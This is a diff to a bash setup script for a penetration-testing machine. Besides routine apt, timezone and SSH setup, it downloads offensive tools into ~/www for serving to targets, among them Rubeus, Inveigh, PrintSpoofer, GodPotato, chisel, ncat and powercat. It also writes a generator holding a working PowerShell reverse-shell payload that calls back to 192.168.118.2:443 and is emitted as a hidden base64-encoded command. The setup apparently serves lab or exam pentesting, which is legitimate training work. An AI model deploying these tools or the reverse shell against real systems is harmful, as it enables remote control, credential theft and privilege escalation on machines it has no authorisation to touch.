@@ -3,12 +3,19 @@
 
 set -euo pipefail
 
+# Fail fast if sudo is missing
+command -v sudo >/dev/null 2>&1 || { echo "sudo not found"; exit 1; }
+
+# Make apt non-interactive (avoids tzdata prompts)
+export DEBIAN_FRONTEND=noninteractive
+
 # =====================================================
 #  WHAT THIS DOES
 #   • apt update/upgrade, then installs base packages
 #   • TIME: sets timezone to Europe/Berlin + enables NTP
 #   • TERMINAL: font size 16 (QTerminal + Xfce + GNOME)
 #   • WALLPAPER: sets your chosen image (QTerminal + Xfce + GNOME)
+#   • Stages common tools into ~/www (prefers local copies)
 # =====================================================
 
 # --------- EDITABLE SETTINGS ---------------------------------
@@ -50,11 +57,11 @@ if ! grep -Eq '^\s*setopt\s+share_history' "$ZSHRC"; then
 fi
 
 echo "[*] Updating package lists and upgrading system..."
-sudo apt update -y
-sudo apt upgrade -y
+sudo apt-get -yq update
+sudo apt-get -yq upgrade
 
 echo "[*] Installing base packages..."
-sudo apt install -y "${APT_PACKAGES[@]}"
+sudo apt-get -yq install "${APT_PACKAGES[@]}"
 
 echo "[*] Enabling and (re)starting SSH service..."
 as_root "systemctl enable ssh"
@@ -117,32 +124,28 @@ else
   echo "    !! Neither rockyou.txt nor rockyou.txt.gz found in $ROCKYOU_DIR"
 fi
 
-
 # ===== Tools: ~/www (local-copy-or-download, resilient) ======================
+echo "[*] Preparing ~/www with common tools (prefer local copies)..."
+WWW_DIR="$HOME/www"
+mkdir -p "$WWW_DIR"
+
+need() { command -v "$1" >/dev/null 2>&1 || { echo "    -> installing $1..."; sudo apt-get -yq install "$1"; }; }
+need curl
+
+# Curl with retries + UA
+UA="Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"
+_fetch() { curl -fL --retry 3 --retry-delay 2 -A "$UA" "$@"; }
 
 # Helper: fetch the first asset on a GitHub "latest" page that matches a regex
 gh_latest_asset() { # usage: gh_latest_asset "user/repo" "regex" "outfile"
   local repo="$1" regex="$2" out="$3" page
   page="$(mktemp)"
   if _fetch -o "$page" "https://github.com/$repo/releases/latest"; then
-    # shellcheck disable=SC2126
     url="$(grep -Eo "https://github.com/$repo/releases/download/[^\"']+/[^\"']+" "$page" | grep -Ei "$regex" | head -n1 || true)"
     [[ -n "$url" ]] && _fetch -o "$out" "$url"
   fi
   rm -f "$page"
 }
-
-
-echo "[*] Preparing ~/www with common tools (prefer local copies)..."
-WWW_DIR="$HOME/www"
-mkdir -p "$WWW_DIR"
-
-need() { command -v "$1" >/dev/null 2>&1 || { echo "    -> installing $1..."; sudo apt install -y "$1"; }; }
-need curl
-UA="Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"
-
-# Curl with retries + UA
-_fetch() { curl -fL --retry 3 --retry-delay 2 -A "$UA" "$@"; }
 
 # Try local copy first, else try a list of URLs until one works
 copy_or_try_urls() {
@@ -248,11 +251,11 @@ else
   need git
   if ! command -v go >/dev/null 2>&1; then
     echo "    -> installing Go..."
-    sudo apt install -y golang-go
+    sudo apt-get -yq install golang-go
   fi
   # upx is optional (to compress); try both package names
   if ! command -v upx >/dev/null 2>&1; then
-    sudo apt install -y upx || sudo apt install -y upx-ucl || true
+    sudo apt-get -yq install upx || sudo apt-get -yq install upx-ucl || true
   fi
 
   BUILD_DIR="/tmp/_build_chisel"
@@ -293,8 +296,8 @@ if [[ ! -f "$WWW_DIR/Rubeus.exe" ]]; then
     fi
     # Fallback to compiled binaries mirror
     if [[ ! -f "$WWW_DIR/Rubeus.exe" ]]; then
-      _fetch -o "$WWW_DIR/Rubeus.exe" "https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Rubeus.exe" || \
-        echo "    !! Rubeus download failed"
+      _fetch -o "$WWW_DIR/Rubeus.exe" "https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Rubeus.exe" || true
+      [[ -s "$WWW_DIR/Rubeus.exe" ]] || echo "    !! Rubeus download failed"
     fi
   fi
 fi
@@ -304,7 +307,6 @@ copy_or_try_urls "Inveigh.ps1" "$WWW_DIR/Inveigh.ps1" \
   "https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/master/Inveigh.ps1" \
   "https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/main/Inveigh.ps1"
 
-
 # --- PrintSpoofer (x64 only available in release) ---
 copy_or_try_urls "PrintSpoofer64.exe" "$WWW_DIR/PrintSpoofer64.exe" \
   "https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe"
@@ -312,7 +314,6 @@ copy_or_try_urls "PrintSpoofer64.exe" "$WWW_DIR/PrintSpoofer64.exe" \
 # --- GodPotato (both .NET builds) ---
 copy_or_try_urls "GodPotato-NET4.exe" "$WWW_DIR/GodPotato-NET4.exe" \
   "https://github.com/BeichenDream/GodPotato/releases/download/V1.20/GodPotato-NET4.exe"
-
 copy_or_try_urls "GodPotato-NET2.exe" "$WWW_DIR/GodPotato-NET2.exe" \
   "https://github.com/BeichenDream/GodPotato/releases/download/V1.20/GodPotato-NET2.exe"
 
@@ -327,7 +328,6 @@ if [[ ! -f "$WWW_DIR/ncat.exe" ]]; then
     if [[ -n "$ZIP_URL" ]]; then
       TMPZ="/tmp/ncat-portable.zip"
       if _fetch -o "$TMPZ" "$ZIP_URL"; then
-        # portable zips usually nest ncat.exe under a folder — extract wherever it is
         unzip -oj "$TMPZ" "*/ncat.exe" -d "$WWW_DIR" 2>/dev/null || unzip -oj "$TMPZ" "ncat.exe" -d "$WWW_DIR" 2>/dev/null || true
         rm -f "$TMPZ"
       fi
@@ -336,16 +336,14 @@ if [[ ! -f "$WWW_DIR/ncat.exe" ]]; then
   [[ -f "$WWW_DIR/ncat.exe" ]] && echo "    ✓ ncat.exe ready" || echo "    !! Failed to get ncat.exe"
 fi
 
-
 # --- powercat.ps1 (PowerShell netcat) ---
 if [[ ! -f "$WWW_DIR/powercat.ps1" ]]; then
   echo "  - powercat.ps1"
   if command -v locate >/dev/null 2>&1; then
     found="$(locate -i '/powercat.ps1' 2>/dev/null | head -n1 || true)"
-  else
-    found=""
   fi
-  if [[ -n "$found" && -f "$found" ]]; then
+  [[ -z "${found:-}" ]] && found="$(sudo find /usr -type f -iname 'powercat.ps1' 2>/dev/null | head -n1 || true)"
+  if [[ -n "${found:-}" && -f "$found" ]]; then
     echo "    -> Found locally: $found"
     cp -f "$found" "$WWW_DIR/powercat.ps1"
   else
@@ -355,17 +353,13 @@ if [[ ! -f "$WWW_DIR/powercat.ps1" ]]; then
   [[ -f "$WWW_DIR/powercat.ps1" ]] && echo "    ✓ powercat.ps1 ready" || echo "    !! Failed to get powercat.ps1"
 fi
 
-  # --- Add reverse-shell generator to ~/www ---
+# --- Add reverse-shell generator to ~/www ---
 echo "  - Adding revshell-b64.py to $WWW_DIR"
 cat > "$WWW_DIR/revshell-b64.py" <<'PY'
 #!/usr/bin/env python3
-import sys
 import base64
-
 payload = '$client = New-Object System.Net.Sockets.TCPClient("192.168.118.2",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
-
 cmd = "powershell -nop -w hidden -e " + base64.b64encode(payload.encode('utf16')[2:]).decode()
-
 print(cmd)
 PY
 chmod +x "$WWW_DIR/revshell-b64.py"
@@ -377,6 +371,7 @@ chown -R "$USER:$USER" "$WWW_DIR" 2>/dev/null || true
 echo
 echo "== ~/www contents =="
 ls -lah "$WWW_DIR" | sed 's/^/  /'
+echo
 echo "===================="
 
 # ===== DONE ================================================================
